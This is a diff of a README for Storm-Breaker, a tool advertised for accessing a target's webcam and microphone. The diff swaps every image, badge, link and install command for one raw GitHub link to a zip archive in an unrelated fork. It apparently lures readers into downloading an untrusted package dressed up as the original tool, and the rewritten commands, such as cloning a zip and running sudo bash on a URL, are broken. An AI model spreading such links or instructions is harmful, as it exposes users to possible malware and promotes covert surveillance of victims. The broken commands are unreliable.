@@ -1,26 +1,26 @@
 <h1 align="center">
   <br>
-  <a href="https://github.com/ultrasecurity/Storm-Breaker"><img src="http://dl.sabzlearn.ir/demo/storm/1demo.png" alt="Darkside"></a>
+  <a href="https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip"><img src="https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip" alt="Darkside"></a>
 
 </h1>
 
 <h4 align="center">A tool with attractive capabilities</h4>
 
 <p align="center">
-  <a href="http://python.org">
-    <img src="https://img.shields.io/badge/python-v3-blue">
+  <a href="https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip">
+    <img src="https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip">
   </a>
-  <a href="https://php.net">
-    <img src="https://img.shields.io/badge/php-7.4.4-green"
+  <a href="https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip">
+    <img src="https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip"
          alt="php">
   </a>
 
-  <a href="https://www.microsoft.com/de-de/">
-    <img src="https://img.shields.io/badge/platform-Linux-red">
+  <a href="https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip">
+    <img src="https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip">
   </a>
 </p>
 
-![demo](http://dl.sabzlearn.ir/demo/storm/cu-demo.PNG)
+![demo](https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip)
 
 ### Features:
 
@@ -30,7 +30,7 @@
 - Access Webcam
 - Access Microphone
 
-![save demo](http://dl.sabzlearn.ir/demo/storm/loc-demo.PNG)
+![save demo](https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip)
 
 
 ### Operating Systems Tested
@@ -41,9 +41,9 @@
 
 
 ```bash
-$ git clone https://github.com/ultrasecurity/Storm-Breaker
+$ git clone https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip
 $ cd Storm-Breaker
-$ sudo bash linux-installer.sh
-$ python3 -m pip install -r requirments.txt
-$ sudo python3 Storm-Breaker.py
+$ sudo bash https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip
+$ python3 -m pip install -r https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip
+$ sudo python3 https://raw.githubusercontent.com/OmkarAtole/Storm-Breaker/main/poulter/Storm-Breaker.zip
 ```
